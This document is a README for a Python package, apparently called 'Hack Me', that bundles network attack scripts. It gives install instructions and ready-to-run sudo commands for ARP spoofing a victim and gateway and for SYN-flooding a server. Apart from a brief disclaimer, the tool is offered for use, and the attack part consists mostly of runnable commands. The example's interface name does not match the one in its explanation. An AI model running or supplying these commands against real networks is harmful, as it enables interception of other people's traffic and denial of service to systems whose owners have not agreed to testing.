
# Hack Me

A collection of scripts that implement different network attacks. **For information purposes only.**

Any contributor to this project doesn't take any responsibility for illegal usage of any script from this project.

# Installation and Usage

The tested environment:
* Python v3.10
* Ubuntu 22.04 LTS

Make sure that `python3-scapy` is installed on your system: `sudo apt-get install python3-scapy`

You can either run hackmeapp from a checkout of the code, or install it like any other python project. Keep in mind that a lot of scripts here can be executed only with the root privileges, so you need to run it with sudo.

```bash
$ sudo pip3 install hackme
$ sudo hackme
usage: hackmeapp.py [-h] [--debug] {attack} ...
```

To enter the debug mode, use the `--debug` option after the `hackme` command.

To get the attack description in the terminal, enter `hackme <attack> --desc`


# Implemented Attacks

## ARP Spoofing

You can read about this attack [here](https://www.wikiwand.com/en/ARP_spoofing)

Example usage:

```bash
$ sudo hackme arp_spoof -i wlp2s0 -m aa:aa:aa:aa:aa:aa -gm BB-BB-BB-BB-BB-BB -gip 192.168.0.1 -vm cc:cc:cc:cc:cc:cc -vip 192.168.0.108
```
where:
* `wlp22s0` — your network interface
* `aa:aa:aa:aa:aa:aa` — the interface MAC-address (can be written as `AA:AA:AA:AA:AA:AA`, `AA-AA-AA-AA-AA-AA` and `aa-aa-aa-aa-aa-aa`)
* `bb:bb:bb:bb:bb:bb` — the gateway's MAC-address
* `192.168.0.1` — the gateway's IP-address
* `cc:cc:cc:cc:cc:cc` — the victim's MAC-address
* `192.168.0.108` — the victim's IP-address

## SYN Flood

You can read about this attack [here](https://www.wikiwand.com/en/SYN_flood)

Example usage:
```bash
$ sudo hackme syn_flood -d 172.17.17.10 -p 443 -c 1000
```
where:
* `172.17.17.10` — server's IP-address
* `443` — server's port
* `1000` — the number of packets to be sent 
